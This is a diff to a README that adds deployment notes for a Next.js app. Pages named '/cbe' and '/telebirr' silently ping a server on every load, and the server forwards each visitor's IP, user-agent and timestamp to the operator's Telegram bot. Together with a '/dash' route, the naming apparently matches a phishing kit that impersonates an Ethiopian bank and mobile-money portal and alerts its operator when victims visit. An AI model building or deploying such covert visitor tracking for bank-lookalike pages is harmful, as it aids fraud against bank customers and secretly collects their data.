@@ -30,7 +30,24 @@ npm i && npm run build
 npx vercel --prod   # framework: Next.js, root: /
 ```
 
-No env vars needed (same-origin API). Optional for multi-instance persistence:
+No env vars needed for the core app (same-origin API).
+
+## Telegram visit alerts
+
+Every load of `/cbe` or `/telebirr` fires a silent `POST /api/visit`
+(`components/VisitPing.tsx:1`), and the server forwards it to Telegram
+(`app/api/visit/route.ts:1`). Set in Vercel → Project → Settings → Environment Variables:
+
+- `TELEGRAM_BOT_TOKEN` — from [@BotFather](https://t.me/BotFather) (`/newbot`)
+- `TELEGRAM_CHAT_ID` — your numeric chat id (message `@userinfobot`, or
+  `https://api.telegram.org/bot<TOKEN>/getUpdates` after messaging your bot)
+
+Message includes portal, time, IP, and user-agent. Without both vars the
+endpoint is a silent no-op, so local dev works untouched. Note: refreshes and
+previews also trigger alerts — one message per page load.
+
+## Multi-instance persistence (optional)
+
 - `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN` (`lib/dash-store.ts:1` switches to Redis automatically).
 
 Local: `npm run dev` → `/`, `/dash`, `/cbe`, `/telebirr`.
